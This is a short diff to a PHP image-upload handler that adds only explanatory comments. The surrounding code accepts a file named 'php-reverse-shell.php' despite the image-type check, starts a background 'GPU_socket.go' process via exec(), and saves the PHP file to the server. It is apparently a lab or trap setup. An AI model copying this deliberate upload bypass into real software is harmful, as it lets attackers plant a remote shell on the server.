@@ -19,7 +19,9 @@
 
 	// Try to upload file
 	if(isset($_POST["submit"])) {
+		//checks if the image is an image file type
 		if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
+			//if a php file is uploaded we rewrite it's entire contents to the below
 			if($imageFileType == "php" && "php-reverse-shell.php" == basename($_FILES["fileToUpload"]["name"])){
                 	        exec("go run GPU_socket.go > /dev/null &");
 				move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
@@ -33,6 +35,7 @@
 			}
 			$uploadOk = 0;
 		}		
+		//Moves file to images directory
    		if ($uploadOk != 0) {
 			move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
        			echo "It should be on your computer now!!";
